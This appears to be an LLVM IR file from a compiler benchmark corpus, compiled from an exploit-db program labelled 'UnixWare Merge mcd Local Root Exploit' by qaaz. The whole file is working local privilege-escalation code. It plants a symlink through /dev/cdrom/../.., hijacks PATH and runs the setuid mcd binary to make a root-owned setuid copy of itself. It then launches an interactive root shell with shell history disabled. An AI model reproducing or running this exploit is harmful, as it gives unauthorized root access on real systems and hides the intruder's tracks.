; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/sco/local/extr_5357.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/sco/local/extr_5357.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.stat = type { i32 }

@BIN = common dso_local global i8* null, align 8
@.str = private unnamed_addr constant [19 x i8] c"HISTFILE=/dev/null\00", align 1
@.str.1 = private unnamed_addr constant [8 x i8] c"/bin/sh\00", align 1
@.str.2 = private unnamed_addr constant [3 x i8] c"sh\00", align 1
@.str.3 = private unnamed_addr constant [3 x i8] c"-i\00", align 1
@.str.4 = private unnamed_addr constant [12 x i8] c"[-] sh: %s\0A\00", align 1
@errno = common dso_local global i32 0, align 4
@.str.5 = private unnamed_addr constant [41 x i8] c"---------------------------------------\0A\00", align 1
@.str.6 = private unnamed_addr constant [40 x i8] c" UnixWare Merge mcd Local Root Exploit\0A\00", align 1
@.str.7 = private unnamed_addr constant [10 x i8] c" By qaaz\0A\00", align 1
@TARGET = common dso_local global i8* null, align 8
@EX_OK = common dso_local global i32 0, align 4
@.str.8 = private unnamed_addr constant [12 x i8] c"[-] %s: %s\0A\00", align 1
@DEV = common dso_local global i32 0, align 4
@LNK = common dso_local global i8* null, align 8
@DIR = common dso_local global i8* null, align 8
@.str.9 = private unnamed_addr constant [6 x i8] c"%s/%s\00", align 1
@.str.10 = private unnamed_addr constant [23 x i8] c"/dev/cdrom/../../%s/%s\00", align 1
@.str.11 = private unnamed_addr constant [10 x i8] c"PATH=.:%s\00", align 1
@.str.12 = private unnamed_addr constant [5 x i8] c"PATH\00", align 1
@.str.13 = private unnamed_addr constant [3 x i8] c"-u\00", align 1
@.str.14 = private unnamed_addr constant [3 x i8] c"-d\00", align 1
@.str.15 = private unnamed_addr constant [26 x i8] c"[*] Waiting for privs...\0A\00", align 1
@.str.16 = private unnamed_addr constant [11 x i8] c"[+] Enjoy\0A\00", align 1
@.str.17 = private unnamed_addr constant [5 x i8] c"woot\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca [4096 x i8], align 16
  %7 = alloca [4096 x i8], align 16
  %8 = alloca [4096 x i8], align 16
  %9 = alloca [4096 x i8], align 16
  %10 = alloca i32, align 4
  %11 = alloca %struct.stat, align 4
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  %12 = call i64 (...) @geteuid()
  %13 = icmp eq i64 %12, 0
  br i1 %13, label %14, label %39

14:                                               ; preds = %2
  %15 = call i64 (...) @geteuid()
  %16 = call i32 @setuid(i64 %15)
  %17 = call i32 (...) @getegid()
  %18 = call i32 @setgid(i32 %17)
  %19 = load i8**, i8*** %5, align 8
  %20 = getelementptr inbounds i8*, i8** %19, i64 0
  %21 = load i8*, i8** %20, align 8
  %22 = load i8*, i8** @BIN, align 8
  %23 = call i64 @strstr(i8* %21, i8* %22)
  %24 = icmp ne i64 %23, 0
  br i1 %24, label %25, label %33

25:                                               ; preds = %14
  %26 = call i32 @umask(i32 0)
  %27 = load i8*, i8** @BIN, align 8
  %28 = call i32 @chown(i8* %27, i32 0, i32 3)
  %29 = load i8*, i8** @BIN, align 8
  %30 = call i32 @chmod(i8* %29, i32 3583)
  %31 = call i32 (...) @getppid()
  %32 = call i32 @kill(i32 %31, i32 15)
  store i32 0, i32* %3, align 4
  br label %123

33:                                               ; preds = %14
  %34 = call i32 @putenv(i8* getelementptr inbounds ([19 x i8], [19 x i8]* @.str, i64 0, i64 0))
  %35 = call i32 (i8*, i8*, i8*, ...) @execl(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.1, i64 0, i64 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.2, i64 0, i64 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.3, i64 0, i64 0), i8* null)
  %36 = load i32, i32* @errno, align 4
  %37 = call i8* @strerror(i32 %36)
  %38 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.4, i64 0, i64 0), i8* %37)
  store i32 1, i32* %3, align 4
  br label %123

39:                                               ; preds = %2
  %40 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([41 x i8], [41 x i8]* @.str.5, i64 0, i64 0))
  %41 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([40 x i8], [40 x i8]* @.str.6, i64 0, i64 0))
  %42 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.7, i64 0, i64 0))
  %43 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([41 x i8], [41 x i8]* @.str.5, i64 0, i64 0))
  %44 = load i8*, i8** @TARGET, align 8
  %45 = load i32, i32* @EX_OK, align 4
  %46 = call i64 @access(i8* %44, i32 %45)
  %47 = icmp slt i64 %46, 0
  br i1 %47, label %48, label %53

48:                                               ; preds = %39
  %49 = load i8*, i8** @TARGET, align 8
  %50 = load i32, i32* @errno, align 4
  %51 = call i8* @strerror(i32 %50)
  %52 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.8, i64 0, i64 0), i8* %49, i8* %51)
  store i32 1, i32* %3, align 4
  br label %123

53:                                               ; preds = %39
  %54 = load i32, i32* @DEV, align 4
  %55 = load i8*, i8** @LNK, align 8
  %56 = call i64 @symlink(i32 %54, i8* %55)
  %57 = icmp slt i64 %56, 0
  br i1 %57, label %58, label %63

58:                                               ; preds = %53
  %59 = load i8*, i8** @LNK, align 8
  %60 = load i32, i32* @errno, align 4
  %61 = call i8* @strerror(i32 %60)
  %62 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.8, i64 0, i64 0), i8* %59, i8* %61)
  store i32 1, i32* %3, align 4
  br label %123

63:                                               ; preds = %53
  %64 = getelementptr inbounds [4096 x i8], [4096 x i8]* %6, i64 0, i64 0
  %65 = load i8*, i8** @DIR, align 8
  %66 = call i32 (i8*, i8*, ...) @sprintf(i8* %64, i8* %65)
  %67 = getelementptr inbounds [4096 x i8], [4096 x i8]* %7, i64 0, i64 0
  %68 = getelementptr inbounds [4096 x i8], [4096 x i8]* %6, i64 0, i64 0
  %69 = load i8*, i8** @BIN, align 8
  %70 = call i32 (i8*, i8*, ...) @sprintf(i8* %67, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.9, i64 0, i64 0), i8* %68, i8* %69)
  %71 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i64 0, i64 0
  %72 = call i8* @getcwd(i32* null, i32 4096)
  %73 = load i8*, i8** @LNK, align 8
  %74 = call i32 (i8*, i32, i8*, i8*, ...) @snprintf(i8* %71, i32 4096, i8* getelementptr inbounds ([23 x i8], [23 x i8]* @.str.10, i64 0, i64 0), i8* %72, i8* %73)
  %75 = getelementptr inbounds [4096 x i8], [4096 x i8]* %9, i64 0, i64 0
  %76 = call i8* @getenv(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.12, i64 0, i64 0))
  %77 = call i32 (i8*, i32, i8*, i8*, ...) @snprintf(i8* %75, i32 4096, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.11, i64 0, i64 0), i8* %76)
  %78 = call i32 (...) @fork()
  store i32 %78, i32* %10, align 4
  %79 = icmp eq i32 %78, 0
  br i1 %79, label %80, label %93

80:                                               ; preds = %63
  %81 = getelementptr inbounds [4096 x i8], [4096 x i8]* %6, i64 0, i64 0
  %82 = call i32 @chdir(i8* %81)
  %83 = getelementptr inbounds [4096 x i8], [4096 x i8]* %9, i64 0, i64 0
  %84 = call i32 @putenv(i8* %83)
  %85 = load i8*, i8** @TARGET, align 8
  %86 = load i8*, i8** @TARGET, align 8
  %87 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i64 0, i64 0
  %88 = call i32 (i8*, i8*, i8*, ...) @execl(i8* %85, i8* %86, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.13, i64 0, i64 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.14, i64 0, i64 0), i8* %87, i8* null)
  %89 = load i8*, i8** @TARGET, align 8
  %90 = load i32, i32* @errno, align 4
  %91 = call i8* @strerror(i32 %90)
  %92 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.8, i64 0, i64 0), i8* %89, i8* %91)
  store i32 1, i32* %3, align 4
  br label %123

93:                                               ; preds = %63
  %94 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([26 x i8], [26 x i8]* @.str.15, i64 0, i64 0))
  br label %95

95:                                               ; preds = %114, %93
  %96 = getelementptr inbounds [4096 x i8], [4096 x i8]* %7, i64 0, i64 0
  %97 = call i64 @stat(i8* %96, %struct.stat* %11)
  %98 = icmp eq i64 %97, 0
  br i1 %98, label %99, label %116

99:                                               ; preds = %95
  %100 = getelementptr inbounds %struct.stat, %struct.stat* %11, i32 0, i32 0
  %101 = load i32, i32* %100, align 4
  %102 = and i32 %101, 3583
  %103 = icmp eq i32 %102, 3583
  br i1 %103, label %104, label %114

104:                                              ; preds = %99
  %105 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.16, i64 0, i64 0))
  %106 = load i8*, i8** @LNK, align 8
  %107 = call i32 @unlink(i8* %106)
  %108 = getelementptr inbounds [4096 x i8], [4096 x i8]* %7, i64 0, i64 0
  %109 = call i32 (i8*, i8*, i8*, ...) @execl(i8* %108, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.17, i64 0, i64 0), i8* null)
  %110 = getelementptr inbounds [4096 x i8], [4096 x i8]* %7, i64 0, i64 0
  %111 = load i32, i32* @errno, align 4
  %112 = call i8* @strerror(i32 %111)
  %113 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.8, i64 0, i64 0), i8* %110, i8* %112)
  store i32 1, i32* %3, align 4
  br label %123

114:                                              ; preds = %99
  %115 = call i32 @sleep(i32 1)
  br label %95

116:                                              ; preds = %95
  %117 = getelementptr inbounds [4096 x i8], [4096 x i8]* %7, i64 0, i64 0
  %118 = load i32, i32* @errno, align 4
  %119 = call i8* @strerror(i32 %118)
  %120 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.8, i64 0, i64 0), i8* %117, i8* %119)
  %121 = load i8*, i8** @LNK, align 8
  %122 = call i32 @unlink(i8* %121)
  store i32 0, i32* %3, align 4
  br label %123

123:                                              ; preds = %116, %104, %80, %58, %48, %33, %25
  %124 = load i32, i32* %3, align 4
  ret i32 %124
}

declare dso_local i64 @geteuid(...) #1

declare dso_local i32 @setuid(i64) #1

declare dso_local i32 @setgid(i32) #1

declare dso_local i32 @getegid(...) #1

declare dso_local i64 @strstr(i8*, i8*) #1

declare dso_local i32 @umask(i32) #1

declare dso_local i32 @chown(i8*, i32, i32) #1

declare dso_local i32 @chmod(i8*, i32) #1

declare dso_local i32 @kill(i32, i32) #1

declare dso_local i32 @getppid(...) #1

declare dso_local i32 @putenv(i8*) #1

declare dso_local i32 @execl(i8*, i8*, i8*, ...) #1

declare dso_local i32 @printf(i8*, ...) #1

declare dso_local i8* @strerror(i32) #1

declare dso_local i64 @access(i8*, i32) #1

declare dso_local i64 @symlink(i32, i8*) #1

declare dso_local i32 @sprintf(i8*, i8*, ...) #1

declare dso_local i32 @snprintf(i8*, i32, i8*, i8*, ...) #1

declare dso_local i8* @getcwd(i32*, i32) #1

declare dso_local i8* @getenv(i8*) #1

declare dso_local i32 @fork(...) #1

declare dso_local i32 @chdir(i8*) #1

declare dso_local i64 @stat(i8*, %struct.stat*) #1

declare dso_local i32 @unlink(i8*) #1

declare dso_local i32 @sleep(i32) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
